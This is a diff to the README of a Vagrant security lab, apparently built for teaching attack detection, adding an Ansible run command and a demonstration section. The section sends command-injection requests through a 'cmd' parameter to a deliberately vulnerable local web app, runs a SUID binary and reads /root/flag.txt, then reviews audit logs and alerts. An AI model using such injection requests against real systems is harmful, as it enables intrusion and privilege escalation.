@@ -22,6 +22,11 @@ cd vagrant
 vagrant up
 ```
 
+3. **Run and debug ansible**:
+```bash
+PYTHONUNBUFFERED=1 ansible-playbook   -i ansible/vagrant_inventory.py   --become   -v   --extra-vars "ansible_python_interpreter=/usr/bin/python3"   -e "ansible_ssh_common_args='-o StrictHostKeyChecking=no'"   ansible/playbook.yml
+```
+
 ## Accessing the Lab
 
 ### Get VM IP address
@@ -162,3 +167,46 @@ vagrant destroy -f
 ## Security Notice
 
 ⚠️ **Warning**: This lab contains intentionally vulnerable components for educational purposes. Do not deploy or use these components in production environments.
+
+## Demonstration Commands
+
+Follow these commands step by step to simulate attacks and then review alerts and logs:
+
+1. Start the lab environment:
+```bash
+cd src
+vagrant up
+```
+
+2. SSH into the VM:
+```bash
+vagrant ssh
+```
+
+3. Exploit the vulnerable web application:
+```bash
+curl "http://localhost:8080/?cmd=id"
+curl "http://localhost:8080/?cmd=/usr/local/bin/suid_demo"
+curl "http://localhost:8080/?cmd=cat+/root/flag.txt"
+```
+
+4. Check the recent audit logs:
+```bash
+sudo tail -n 50 /var/log/audit/audit.log
+```
+
+5. Run the alert check script to see privilege escalation and SUID modification alerts:
+```bash
+sudo /usr/local/bin/check_alerts
+```
+
+6. Generate a detailed security report using log analysis tools:
+```bash
+cd /home/vagrant
+./generate_report.sh
+```
+
+7. Verify the generated security report:
+```bash
+ls -ltr ~/security_report_*.txt
+```
